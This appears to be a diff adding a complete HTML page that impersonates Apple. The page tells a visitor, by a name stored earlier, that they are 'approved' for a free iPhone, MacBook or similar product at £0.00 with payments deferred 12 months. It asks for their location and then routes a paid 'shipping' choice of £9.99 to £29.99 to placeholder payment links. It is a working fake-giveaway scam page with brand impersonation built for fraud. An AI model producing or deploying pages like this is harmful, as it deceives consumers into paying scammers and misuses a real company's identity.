@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Approved</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f5f7;
+            margin: 0;
+            color: #1d1d1f;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+        }
+        /* Header */
+        header {
+            padding: 20px;
+            background-color: #fff;
+            border-bottom: 1px solid #d2d2d7;
+            text-align: center;
+            width: 100%;
+        }
+        .apple-logo {
+            width: 60px;
+            height: auto;
+        }
+        /* Main Content */
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 18px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .checkmark-img {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 10px;
+        }
+        .container h1 {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1d1d1f;
+        }
+        .container p {
+            font-size: 17px;
+            color: #6e6e73;
+            margin-bottom: 30px;
+        }
+        .selected-product {
+            font-size: 16px;
+            color: #1d1d1f;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .selected-product .product-name {
+            font-weight: 600;
+        }
+        .selected-product .color {
+            color: #0071e3;
+            font-weight: 600;
+        }
+        .selected-product .price {
+            color: #0071e3;
+            font-weight: 600;
+            margin-left: 5px;
+        }
+        .location-btn {
+            padding: 12px 24px;
+            background-color: #0071e3;
+            color: #fff;
+            border: none;
+            border-radius: 18px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 300px;
+        }
+        .location-btn:hover {
+            opacity: 0.8;
+        }
+        .location-result {
+            font-size: 17px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #d2d2d7;
+            padding-bottom: 10px;
+            text-align: center;
+            width: 100%;
+        }
+        .location-result .region {
+            color: #0071e3;
+            font-weight: 600;
+            background-color: #e8f0fe;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+        .shipping-options {
+            text-align: center;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+        .shipping-option {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+            padding: 12px;
+            background-color: #fafafa;
+            border-radius: 12px;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        .shipping-option:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        .shipping-option input[type="checkbox"] {
+            margin-right: 10px;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #d2d2d7;
+            border-radius: 4px;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .shipping-option input[type="checkbox"]:checked {
+            border-color: #0071e3;
+            background-color: #0071e3;
+        }
+        .shipping-option input[type="checkbox"]:checked::after {
+            content: '✓';
+            color: #fff;
+            font-size: 14px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .shipping-option label {
+            font-size: 17px;
+            color: #1d1d1f;
+            cursor: pointer;
+            text-align: left;
+        }
+        .shipping-option label .price {
+            color: #0071e3;
+            font-weight: 600;
+        }
+        .claim-btn {
+            display: inline-block;
+            padding: 12px 24px;
+            background-color: #0071e3;
+            color: #fff;
+            border: none;
+            border-radius: 18px;
+            font-size: 17px;
+            font-weight: 600;
+            transition: opacity 0.3s ease;
+            cursor: pointer;
+            margin: 0 auto;
+            width: 100%;
+            max-width: 300px;
+        }
+        .claim-btn:disabled {
+            background-color: #0071e3;
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .claim-btn:hover:not(:disabled) {
+            opacity: 0.8;
+        }
+        /* Footer */
+        footer {
+            background-color: #f5f5f7;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #6e6e73;
+            border-top: 1px solid #d2d2d7;
+            width: 100%;
+        }
+        .footer-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+        }
+        .footer-content .apple-logo {
+            width: 20px;
+            height: auto;
+            background-color: #e8f0fe;
+            padding: 5px;
+            border-radius: 50%;
+        }
+        .footer-content::before,
+        .footer-content::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #d2d2d7;
+            max-width: 100px;
+        }
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+                max-width: 350px;
+                width: 90%;
+                margin: 0 auto;
+            }
+            .container h1 {
+                font-size: 24px;
+            }
+            .container p {
+                font-size: 15px;
+            }
+            .selected-product {
+                font-size: 14px;
+                margin-bottom: 15px;
+            }
+            .location-result {
+                font-size: 15px;
+            }
+            .shipping-option {
+                padding: 10px;
+                max-width: 250px;
+                margin-bottom: 20px;
+            }
+            .shipping-option label {
+                font-size: 15px;
+            }
+            .checkmark-img {
+                width: 50px;
+                height: 50px;
+            }
+            .location-btn, .claim-btn {
+                padding: 10px 20px;
+                font-size: 15px;
+                max-width: 250px;
+            }
+            .apple-logo {
+                width: 50px;
+            }
+            footer {
+                padding: 15px;
+                font-size: 12px;
+            }
+            .footer-content .apple-logo {
+                width: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <img src="https://static.cdnlogo.com/logos/a/38/apple.svg" alt="Apple Logo" class="apple-logo">
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <div class="container">
+            <img src="https://i.ibb.co/TDXW36Dc/image.png" alt="Approved" class="checkmark-img">
+            <h1>User Approved!</h1>
+            <p id="approval-message"></p>
+            <div class="selected-product" id="selected-product"></div>
+            <button class="location-btn" id="get-location">Get Location</button>
+            <div id="location-result" class="location-result"></div>
+            <div id="shipping-options" class="shipping-options" style="display: none;">
+                <div class="shipping-option">
+                    <input type="checkbox" name="shipping" value="7days">
+                    <label><span class="price">£9.99</span> - 7 Business Days</label>
+                </div>
+                <div class="shipping-option">
+                    <input type="checkbox" name="shipping" value="5days">
+                    <label><span class="price">£19.99</span> - 5 Business Days</label>
+                </div>
+                <div class="shipping-option">
+                    <input type="checkbox" name="shipping" value="2days">
+                    <label><span class="price">£29.99</span> - 2 Business Days</label>
+                </div>
+            </div>
+            <button class="claim-btn" id="claim-btn" disabled>Claim</button>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <span>All Rights Reserved by Apple</span>
+            <img src="https://purepng.com/public/uploads/large/purepng.com-apple-logologobrand-logoiconslogos-251519938788qhgdl.png" alt="Apple Logo" class="apple-logo">
+        </div>
+    </footer>
+
+    <script>
+        // Pegar nome, produto e cor do localStorage
+        const fullName = localStorage.getItem('fullName');
+        const selectedProduct = localStorage.getItem('selectedProduct');
+        const selectedColor = localStorage.getItem('selectedColor');
+
+        // Exibir mensagem de aprovação
+        const approvalMessage = document.getElementById('approval-message');
+        approvalMessage.textContent = `Congratulations ${fullName || 'Customer'}, you have been approved and will only start paying in 12 months!`;
+
+        // Exibir produto, cor e preço escolhidos
+        const selectedProductDiv = document.getElementById('selected-product');
+        const productNames = {
+            'macbook': 'MacBook Air',
+            'ipad': 'iPad Pro',
+            'iphone15': 'iPhone 15 Pro Max',
+            'iphone16': 'iPhone 16 Pro Max',
+            'airpodsmax': 'AirPods Max',
+            'airpods4': 'AirPods 4'
+        };
+        const productName = productNames[selectedProduct] || 'Product';
+        selectedProductDiv.innerHTML = `Selected Product: <span class="product-name">${productName}</span> (<span class="color">${selectedColor || 'Color'}</span>), Price: <span class="price">£0.00</span>`;
+
+        // Solicitar localização
+        const getLocationBtn = document.getElementById('get-location');
+        const locationResult = document.getElementById('location-result');
+        const shippingOptions = document.getElementById('shipping-options');
+        const claimBtn = document.getElementById('claim-btn');
+        const shippingCheckboxes = document.querySelectorAll('input[name="shipping"]');
+
+        getLocationBtn.addEventListener('click', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
+                            .then(response => response.json())
+                            .then(data => {
+                                const region = data.address.state || data.address.country || 'Unknown Region';
+                                locationResult.innerHTML = `<span class="region">${region}</span> - Shipping Options:`;
+                                shippingOptions.style.display = 'block';
+                            })
+                            .catch(() => {
+                                locationResult.innerHTML = '<span class="region">Unknown Region</span> - Shipping Options:';
+                                shippingOptions.style.display = 'block';
+                            });
+                    },
+                    () => {
+                        locationResult.innerHTML = '<span class="region">Location access denied</span> - Shipping Options:';
+                        shippingOptions.style.display = 'block';
+                    }
+                );
+            } else {
+                locationResult.innerHTML = '<span class="region">Geolocation not supported</span> - Shipping Options:';
+                shippingOptions.style.display = 'block';
+            }
+        });
+
+        // Lógica de seleção única de frete
+        let selectedShipping = null;
+        shippingCheckboxes.forEach(checkbox => {
+            checkbox.addEventListener('change', () => {
+                // Desmarcar outros checkboxes
+                shippingCheckboxes.forEach(cb => {
+                    if (cb !== checkbox) cb.checked = false;
+                });
+                // Atualizar seleção
+                if (checkbox.checked) {
+                    selectedShipping = checkbox.value;
+                    claimBtn.disabled = false;
+                } else {
+                    selectedShipping = null;
+                    claimBtn.disabled = true;
+                }
+            });
+        });
+
+        // Lógica do botão Claim
+        claimBtn.addEventListener('click', () => {
+            if (selectedShipping) {
+                const links = {
+                    '7days': 'https://testes.com/7dias',
+                    '5days': 'https://testes.com/5dias',
+                    '2days': 'https://testes.com/2dias'
+                };
+                window.location.href = links[selectedShipping];
+            }
+        });
+    </script>
+</body>
+</html>
